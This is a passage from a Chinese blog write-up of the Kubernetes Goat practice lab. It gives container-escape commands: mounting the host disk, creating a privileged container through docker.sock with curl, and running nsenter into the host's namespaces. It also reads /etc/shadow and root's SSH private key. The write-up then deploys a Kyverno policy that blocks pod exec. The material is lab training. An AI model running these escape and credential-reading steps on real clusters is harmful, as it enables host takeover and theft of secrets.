+<p>通过设备文件（如果有 /dev 挂载）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看磁盘设备</span></span><br><span class="line"><span class="built_in">ls</span> -la /host-system/dev/sd* 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果 /dev 目录是从 host 挂载的，可以直接操作设备</span></span><br><span class="line"><span class="built_in">ls</span> -la /dev/sda* 2&gt;/dev/null</span><br><span class="line"><span class="comment"># 然后直接挂载宿主机磁盘</span></span><br><span class="line">mount /dev/sda1 /mnt/hacked_root</span><br></pre></td></tr></table></figure>
+<p>通过容器运行时socket</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 如果 hostPath 包含了 docker.sock</span></span><br><span class="line">curl -s --unix-socket /host-system/var/run/docker.sock http://localhost/containers/json</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可以创建特权容器实现逃逸</span></span><br><span class="line">curl -X POST --unix-socket /host-system/var/run/docker.sock \</span><br><span class="line">  -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">  -d <span class="string">&#x27;&#123;</span></span><br><span class="line"><span class="string">    &quot;Image&quot;: &quot;alpine&quot;,</span></span><br><span class="line"><span class="string">    &quot;Cmd&quot;: [&quot;chroot&quot;, &quot;/host&quot;, &quot;sh&quot;],</span></span><br><span class="line"><span class="string">    &quot;HostConfig&quot;: &#123;</span></span><br><span class="line"><span class="string">      &quot;Binds&quot;: [&quot;/:/host&quot;],</span></span><br><span class="line"><span class="string">      &quot;Privileged&quot;: true</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">  &#125;&#x27;</span> \</span><br><span class="line">  http://localhost/containers/create</span><br></pre></td></tr></table></figure>
+<h4 id="第三步，验证逃逸路径，我该怎么逃？" tabindex="-1"><a class="headerlink" href="#第三步，验证逃逸路径，我该怎么逃？" aria-hidden="true"></a> 第三步，验证逃逸路径，我该怎么逃？</h4>
+<p>验证 nsenter 是否可用</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 检查是否有 nsenter 命令</span></span><br><span class="line"><span class="built_in">which</span> nsenter</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或者直接尝试进入 PID 1 的命名空间</span></span><br><span class="line">nsenter --<span class="built_in">help</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>逃逸命令详解：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nsenter -t 1 -m -u -i -n -p -- /bin/bash</span><br></pre></td></tr></table></figure>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">参数</th>
+<th style="text-align:left">全称</th>
+<th style="text-align:left">含义</th>
+<th style="text-align:left">逃逸作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left"><code>-t 1</code></td>
+<td style="text-align:left"><code>--target 1</code></td>
+<td style="text-align:left">目标进程 PID 为 1</td>
+<td style="text-align:left">指向宿主机的 init/systemd 进程</td>
+</tr>
+<tr>
+<td style="text-align:left"><code>-m</code></td>
+<td style="text-align:left"><code>--mount</code></td>
+<td style="text-align:left">进入 Mount 命名空间</td>
+<td style="text-align:left">获得宿主机的根文件系统视图</td>
+</tr>
+<tr>
+<td style="text-align:left"><code>-u</code></td>
+<td style="text-align:left"><code>--uts</code></td>
+<td style="text-align:left">进入 UTS 命名空间</td>
+<td style="text-align:left">获得宿主机的主机名</td>
+</tr>
+<tr>
+<td style="text-align:left"><code>-i</code></td>
+<td style="text-align:left"><code>--ipc</code></td>
+<td style="text-align:left">进入 IPC 命名空间</td>
+<td style="text-align:left">访问宿主机的进程间通信</td>
+</tr>
+<tr>
+<td style="text-align:left"><code>-n</code></td>
+<td style="text-align:left"><code>--net</code></td>
+<td style="text-align:left">进入 Network 命名空间</td>
+<td style="text-align:left">获得宿主机的网络接口</td>
+</tr>
+<tr>
+<td style="text-align:left"><code>-p</code></td>
+<td style="text-align:left"><code>--pid</code></td>
+<td style="text-align:left">进入 PID 命名空间</td>
+<td style="text-align:left">以宿主机视角看进程树</td>
+</tr>
+<tr>
+<td style="text-align:left"><code>--</code></td>
+<td style="text-align:left">分隔符</td>
+<td style="text-align:left">后续是执行的命令</td>
+<td style="text-align:left">后面跟要在新命名空间执行的 shell</td>
+</tr>
+<tr>
+<td style="text-align:left"><code>/bin/bash</code></td>
+<td style="text-align:left">执行的命令</td>
+<td style="text-align:left">启动 bash</td>
+<td style="text-align:left">在宿主机命名空间中运行 shell</td>
+</tr>
+</tbody>
+</table>
+</blockquote>
+<p>查看宿主机文件系统</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 如果能访问 /host-system，先查看宿主机敏感文件</span></span><br><span class="line"><span class="built_in">cat</span> /host-system/etc/shadow 2&gt;/dev/null</span><br><span class="line"><span class="built_in">cat</span> /host-system/root/.ssh/id_rsa 2&gt;/dev/null</span><br><span class="line"><span class="built_in">ls</span> /host-system/var/lib/kubelet/ 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+<p>尝试挂载宿主机设备</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 检查 /dev 下是否有磁盘设备</span></span><br><span class="line"><span class="built_in">ls</span> -la /dev/sd* /dev/vd* /dev/xvd* 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line"><span class="comment"># 尝试挂载宿主机磁盘</span></span><br><span class="line"><span class="built_in">mkdir</span> -p /mnt/host_root</span><br><span class="line">mount /dev/sda1 /mnt/host_root 2&gt;/dev/null &amp;&amp; <span class="built_in">ls</span> /mnt/host_root/</span><br></pre></td></tr></table></figure>
+<h2 id="二十一、securing-kubernetes-clusters-using-kyverno-policy-engine" tabindex="-1"><a class="headerlink" href="#二十一、securing-kubernetes-clusters-using-kyverno-policy-engine" aria-hidden="true"></a> 二十一、Securing Kubernetes Clusters using Kyverno Policy Engine</h2>
+<p>使用 Kyverno 策略引擎保护 Kubernetes 集群</p>
+<p><a target="_blank" rel="noopener" href="https://kyverno.io/docs/introduction/">Kyverno</a> 是一款专为 Kubernetes 设计的策略引擎。它能够利用准入控制和后台扫描来验证、修改和生成配置。Kyverno 策略是 Kubernetes 资源，无需学习新的编程语言。Kyverno 旨在与您已使用的 <code>kubectl</code> 、 <code>kustomize</code> 和 <code>Git</code> 等工具无缝协作。</p>
+<p>以下是其网站 <a target="_blank" rel="noopener" href="https://kyverno.io/docs/introduction/">https://kyverno.io/docs/introduction/</a> 上列出的部分功能。</p>
+<ul>
+<li>
+<p>将策略作为 Kubernetes 资源（无需学习新语言！）</p>
+</li>
+<li>
+<p>验证、修改、生成或清理（移除）任何资源</p>
+</li>
+<li>
+<p>验证软件供应链安全容器镜像</p>
+</li>
+<li>
+<p>检查图像元数据</p>
+</li>
+<li>
+<p>使用标签选择器和通配符匹配资源</p>
+</li>
+<li>
+<p>使用覆盖层（例如 Kustomize！）进行验证和修改</p>
+</li>
+<li>
+<p>跨命名空间同步配置</p>
+</li>
+<li>
+<p>使用准入控制阻止不符合规范的资源，或报告违反策略的行为。</p>
+</li>
+<li>
+<p>自助式报告（无专有审计日志！）</p>
+</li>
+<li>
+<p>自助服务政策例外情况</p>
+</li>
+<li>
+<p>在将策略应用到集群之前，请在 CI/CD 管道中使用 Kyverno CLI 测试策略并验证资源。</p>
+</li>
+<li>
+<p>使用 git 和 kustomize 等熟悉的工具，以代码形式管理策略。</p>
+</li>
+</ul>
+<p>借助 Kyverno，集群管理员可独立于工作负载管理环境配置，保障集群最佳实践的落地。其手段包括：扫描现有工作负载以排查配置偏差，或通过拦截与修改 API 请求进行强制管控。</p>
+<p>到目前为止，您应该已经了解 Kubernetes 拥有各种资源、配置和组件。大多数安全风险都源于安全配置错误。由于大多数组织都有不同的使用场景、限制、风险承受能力和指导原则，Kyverno 可以将组织策略编码成简单的 YAML 文件，这些文件可以加载到 Kubernetes 集群中，从而根据组织需求验证和强制执行安全最佳实践。</p>
+<p>在这种情况下，我们将研究一个简单的用例，说明如何使用简单的 Kyverno 集群策略在 <code>vault</code> 命名空间中创建 Kyverno 策略来限制任何人 <code>exec</code> pod。</p>
+<p><img src="/2026/04/04/k8s-goat%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-%E4%B8%8B/scenario-22-1d2c06a0672c48504caadc55568323d4.png" alt="scenario-22-1d2c06a0672c48504caadc55568323d4" loading="lazy" decoding="async"></p>
+<p>完成本情景模拟后，你将理解并学习到以下内容：</p>
+<ol>
+<li>将Kyverno Helm Chart部署到Kubernetes集群中。</li>
+<li>你将学习如何在Kubernetes集群中使用Kyverno策略。</li>
+<li>创建和销毁Kubernetes资源，并使用策略应用安全最佳实践。</li>
+</ol>
+<p>此场景旨在为 Kubernetes 资源部署一个简单的 Kyverno 策略，以限制任何人 <code>exec</code> <code>vault</code> 命名空间中的 Pod。然后，通过尝试 <code>exec</code> <code>vault</code> 命名空间中的 Pod 来验证此策略是否得到有效执行。</p>
+<p>先在集群中创建<code>vault</code>命名空间。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl create namespace vault</span><br></pre></td></tr></table></figure>
+<h3 id="kyverno部署安全策略" tabindex="-1"><a class="headerlink" href="#kyverno部署安全策略" aria-hidden="true"></a> Kyverno部署安全策略</h3>
+<p>首先是通过运行以下 Helm Chart 命令将 Kyverno Policy Engine 部署到 Kubernetes 集群中。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">helm repo add kyverno https://kyverno.github.io/kyverno/</span><br><span class="line">helm repo update</span><br><span class="line">helm install kyverno kyverno/kyverno -n kyverno --create-namespace</span><br></pre></td></tr></table></figure>
+<p><img src="/2026/04/04/k8s-goat%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-%E4%B8%8B/image-20260421175800676.png" alt="image-20260421175800676" loading="lazy" decoding="async"></p>
+<p>让我们在 <code>vault</code> 命名空间中运行 Kubernetes Goat Secrets pod。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kubectl --namespace vault run kubernetes-goat-secrets --image=madhuakula/k8s-goat-info-app --port=5000 --restart=Never</span><br><span class="line">kubectl --namespace vault get pods</span><br></pre></td></tr></table></figure>
+<p><img src="/2026/04/04/k8s-goat%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-%E4%B8%8B/image-20260421181330420.png" alt="image-20260421181330420" loading="lazy" decoding="async"></p>
+<p>现在让我们尝试运行以下命令进入 pod 中</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl --namespace vault <span class="built_in">exec</span> -it kubernetes-goat-secrets -- sh</span><br></pre></td></tr></table></figure>
+<p><img src="/2026/04/04/k8s-goat%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-%E4%B8%8B/image-20260421181609793.png" alt="image-20260421181609793" loading="lazy" decoding="async"></p>
+<p>如您所见，我们可以 <code>exec</code> <code>vault</code> 命名空间中的 <code>kubernetes-goat-secrets</code> pod。</p>
+<p>鉴于这是一个安全命名空间，并且包含与 Kubernetes Goat 相关的所有密钥，让我们创建一个 Kyverno 策略并将其应用到 Kubernetes 集群，以阻止/拒绝 <code>valut</code> 命名空间中的任何 <code>exec</code> 请求。</p>
+<p>kyverno-block-pod-exec-by-namespace.yaml</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">kyverno.io/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ClusterPolicy</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">deny-exec-in-vault-namespace</span></span><br><span class="line">  <span class="attr">annotations:</span></span><br><span class="line">    <span class="attr">policies.kyverno.io/title:</span> <span class="string">Block</span> <span class="string">Pod</span> <span class="string">Exec</span> <span class="string">in</span> <span class="string">Vault</span> <span class="string">Namespace</span></span><br><span class="line">    <span class="attr">policies.kyverno.io/category:</span> <span class="string">Sample</span></span><br><span class="line">    <span class="attr">policies.kyverno.io/minversion:</span> <span class="number">1.6</span><span class="number">.0</span></span><br><span class="line">    <span class="attr">policies.kyverno.io/subject:</span> <span class="string">Pod</span></span><br><span class="line">    <span class="attr">policies.kyverno.io/description:</span> <span class="string">&gt;-</span></span><br><span class="line"><span class="string">      The `exec` command may be used to gain shell access, or run other commands, in a Pod&#x27;s container. While this can</span></span><br><span class="line"><span class="string">      be useful for troubleshooting purposes, it could represent an attack vector and is discouraged to use in the</span></span><br><span class="line"><span class="string">      `vault` namespace. This policy blocks Pod exec commands to Pods in a Namespace called `vault`.</span></span><br><span class="line"><span class="string"></span><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">validationFailureAction:</span> <span class="string">Enforce</span></span><br><span class="line">  <span class="attr">background:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">rules:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">deny-exec-ns-vault</span></span><br><span class="line">    <span class="attr">match:</span></span><br><span class="line">      <span class="attr">any:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">resources:</span></span><br><span class="line">          <span class="attr">kinds:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="string">Pod/exec</span></span><br><span class="line">    <span class="attr">preconditions:</span></span><br><span class="line">      <span class="attr">all:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">key:</span> <span class="string">&quot;<span class="template-variable">&#123;&#123; request.operation || &#x27;BACKGROUND&#x27; &#125;&#125;</span>&quot;</span></span><br><span class="line">        <span class="attr">operator:</span> <span class="string">Equals</span></span><br><span class="line">        <span class="attr">value:</span> <span class="string">CONNECT</span></span><br><span class="line">    <span class="attr">validate:</span></span><br><span class="line">      <span class="attr">message:</span> <span class="string">🚨</span> <span class="string">Pods</span> <span class="string">in</span> <span class="string">vault</span> <span class="string">namespace</span> <span class="string">should</span> <span class="string">not</span> <span class="string">be</span> <span class="string">exec&#x27;d</span> <span class="string">into.</span> <span class="string">It</span> <span class="string">has</span> <span class="string">Kubernetes</span> <span class="string">Goat</span> <span class="string">🐐</span> <span class="string">secrets</span> <span class="string">🔥</span></span><br><span class="line">      <span class="attr">deny:</span></span><br><span class="line">        <span class="attr">conditions:</span></span><br><span class="line">          <span class="attr">any:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="attr">key:</span> <span class="string">&quot;<span class="template-variable">&#123;&#123; request.namespace &#125;&#125;</span>&quot;</span></span><br><span class="line">            <span class="attr">operator:</span> <span class="string">Equals</span></span><br><span class="line">            <span class="attr">value:</span> <span class="string">vault</span></span><br></pre></td></tr></table></figure>
+<p>让我们运行以下命令将此 Kyverno 策略部署到集群中。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kubectl apply -f ./tools/scripts/kyverno-block-pod-exec-by-namespace.yaml</span><br><span class="line">kubectl get clusterpolicies</span><br></pre></td></tr></table></figure>
+<p><img src="/2026/04/04/k8s-goat%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-%E4%B8%8B/image-20260421182303440.png" alt="image-20260421182303440" loading="lazy" decoding="async"></p>
+<p>然后再去尝试<code>exec</code> <code>value</code>，发现直接被拒绝了。</p>
+<p><img src="/2026/04/04/k8s-goat%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-%E4%B8%8B/image-20260421182402500.png" alt="image-20260421182402500" loading="lazy" decoding="async"></p>
+<p>上图可知，Kyverno策略阻止了对<code>vault</code>命名空间中的<code>kubernetes-goat-secrets</code> pod的<code>exec</code>。通常情况下，根据我们创建的策略， <code>vault</code> 命名空间中的任何 pod 都会被阻止。</p>
+<p>对创建的资源进行移除</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kubectl delete clusterpolicy deny-exec-in-vault-namespace</span><br><span class="line">kubectl delete ns vault kyverno</span><br></pre></td></tr></table></figure>
+<h2 id="参考" tabindex="-1"><a class="headerlink" href="#参考" aria-hidden="true"></a> 参考</h2>
+<hr class="footnotes-sep">
+<section class="footnotes">
+<ol class="footnotes-list">
+<li id="fn1" class="footnote-item"><p>Helm安装 <a target="_blank" rel="noopener" href="https://helm.sh/docs/helm/helm_install/">https://helm.sh/docs/helm/helm_install/</a> <a href="#fnref1" class="footnote-backref">↩︎</a></p>
+</li>
+<li id="fn2" class="footnote-item"><p>Popeye工具 <a target="_blank" rel="noopener" href="https://github.com/derailed/popeye">https://github.com/derailed/popeye</a> <a href="#fnref2" class="footnote-backref">↩︎</a></p>
+</li>
+<li id="fn3" class="footnote-item"><p>Kubernetes网络策略配方 <a target="_blank" rel="noopener" href="https://github.com/ahmetb/kubernetes-network-policy-recipes">https://github.com/ahmetb/kubernetes-network-policy-recipes</a> <a href="#fnref3" class="footnote-backref">↩︎</a></p>
+</li>
+<li id="fn4" class="footnote-item"><p>Tetragon <a target="_blank" rel="noopener" href="https://github.com/cilium/tetragon">https://github.com/cilium/tetragon</a> <a href="#fnref4" class="footnote-backref">↩︎</a></p>
+</li>
+</ol>
+</section>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2026/04/04/k8s-goat%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-%E4%B8%8A/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+              2026-04-21 18:27:25
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags mr-10" title="标签"></i>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/Kubernetes/" title="Kubernetes">
+                        #Kubernetes
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/" title="容器逃逸">
+                        #容器逃逸
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/%E4%BA%91%E5%AE%89%E5%85%A8/" title="云安全">
+                        #云安全
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+                  <span class="post-categories">
+                    <i class="iconfont icon-bookmark" title="分类"></i>
+                    
+                    <span class="span--category">
+                      <a href="/categories/Web%E5%AE%89%E5%85%A8/" title="Web安全">
+                        <b>#</b> Web安全
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text"> 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%81%E4%B8%80%E3%80%81gaining-environment-information"><span class="toc-text"> 十一、Gaining environment information</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF"><span class="toc-text"> 获取敏感信息</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%81%E4%BA%8C%E3%80%81dos-the-memorycpu-resources"><span class="toc-text"> 十二、DoS the Memory&#x2F;CPU resources</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%91%E8%B5%B7dos%E6%94%BB%E5%87%BB"><span class="toc-text"> 发起DoS攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%81%E4%B8%89%E3%80%81hacker-container-preview"><span class="toc-text"> 十三、Hacker container preview</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#cdk%E7%8E%AF%E5%A2%83%E6%8E%A2%E6%B5%8B"><span class="toc-text"> CDK环境探测</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%81%E5%9B%9B%E3%80%81hidden-in-layers"><span class="toc-text"> 十四、Hidden in layers</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E6%89%BE%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF"><span class="toc-text"> 查找敏感信息</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%81%E4%BA%94%E3%80%81rbac-least-privileges-misconfiguration"><span class="toc-text"> 十五、RBAC least privileges misconfiguration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#rbac%E6%9C%80%E4%BD%8E%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF"><span class="toc-text"> RBAC最低权限配置错误</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4%E7%9A%84%E5%AF%86%E9%92%A5"><span class="toc-text"> 查询命名空间的密钥</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E7%89%B9%E5%AE%9A%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4%E4%B8%AD%E7%9A%84pod"><span class="toc-text"> 查询特定命名空间中的pod</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E5%92%8C%E5%88%A0%E9%99%A4pod"><span class="toc-text"> 创建和删除pod</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96%E5%AF%86%E9%92%A5%E4%BF%A1%E6%81%AF"><span class="toc-text"> 读取密钥信息</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%81%E5%85%AD%E3%80%81kubeaudit-audit-kubernetes-clusters"><span class="toc-text"> 十六、KubeAudit - Audit Kubernetes clusters</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8kubeaudit%E6%89%AB%E6%8F%8F%E6%8E%92%E6%9F%A5%E9%A3%8E%E9%99%A9"><span class="toc-text"> 使用kubeaudit扫描排查风险</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%81%E4%B8%83%E3%80%81falco-runtime-security-monitoring-detection"><span class="toc-text"> 十七、Falco - Runtime security monitoring &amp; detection</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8falco%E6%A3%80%E6%B5%8B%E5%BC%82%E5%B8%B8%E8%A1%8C%E4%B8%BA"><span class="toc-text"> 使用Falco检测异常行为</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%81%E5%85%AB%E3%80%81popeye-a-kubernetes-cluster-sanitizer"><span class="toc-text"> 十八、Popeye - A Kubernetes cluster sanitizer</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#popeye%E6%89%AB%E6%8F%8F%E5%B7%B2%E9%83%A8%E7%BD%B2%E8%B5%84%E6%BA%90%E5%92%8C%E9%85%8D%E7%BD%AE%E4%B8%AD%E5%AD%98%E5%9C%A8%E7%9A%84%E6%BD%9C%E5%9C%A8%E9%97%AE%E9%A2%98"><span class="toc-text"> popeye扫描已部署资源和配置中存在的潜在问题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%81%E4%B9%9D%E3%80%81secure-network-boundaries-using-nsp"><span class="toc-text"> 十九、Secure network boundaries using NSP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#network-policy%E9%99%90%E5%88%B6%E7%BD%91%E7%BB%9C%E9%80%9A%E4%BF%A1"><span class="toc-text"> Network Policy限制网络通信</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E5%8D%81%E3%80%81cilium-tetragon-ebpf-based-security-observability-and-runtime-enforcement"><span class="toc-text"> 二十、Cilium Tetragon - eBPF-based Security Observability and Runtime Enforcement</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#cilium-tetragon%E6%A3%80%E6%B5%8B%E5%BC%82%E5%B8%B8%E8%A1%8C%E4%B8%BA"><span class="toc-text"> Cilium Tetragon检测异常行为</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8"><span class="toc-text"> 容器逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%8C%E7%A1%AE%E8%AE%A4%E7%8E%AF%E5%A2%83%EF%BC%8C%E6%88%91%E5%9C%A8%E5%93%AA%EF%BC%9F"><span class="toc-text"> 第一步，确认环境，我在哪？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%8C%E6%8E%A2%E6%B5%8B%E5%8D%B1%E9%99%A9%E9%85%8D%E7%BD%AE%EF%BC%8C%E6%88%91%E8%83%BD%E9%80%83%E5%87%BA%E5%8E%BB%E5%90%97%EF%BC%9F"><span class="toc-text"> 第二步，探测危险配置，我能逃出去吗？</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E6%98%AF%E5%90%A6%E6%9C%89%E7%89%B9%E6%9D%83%EF%BC%9F"><span class="toc-text"> 1. 是否有特权？</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E6%98%AF%E5%90%A6%E5%85%B1%E4%BA%ABhostpid%EF%BC%9F"><span class="toc-text"> 2. 是否共享hostPID？</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E6%98%AF%E5%90%A6%E6%9C%89hostpath%E6%8C%82%E8%BD%BD%EF%BC%9F"><span class="toc-text"> 3. 是否有hostPath挂载？</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%8C%E9%AA%8C%E8%AF%81%E9%80%83%E9%80%B8%E8%B7%AF%E5%BE%84%EF%BC%8C%E6%88%91%E8%AF%A5%E6%80%8E%E4%B9%88%E9%80%83%EF%BC%9F"><span class="toc-text"> 第三步，验证逃逸路径，我该怎么逃？</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E5%8D%81%E4%B8%80%E3%80%81securing-kubernetes-clusters-using-kyverno-policy-engine"><span class="toc-text"> 二十一、Securing Kubernetes Clusters using Kyverno Policy Engine</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#kyverno%E9%83%A8%E7%BD%B2%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5"><span class="toc-text"> Kyverno部署安全策略</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-text"> 参考</span></a></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
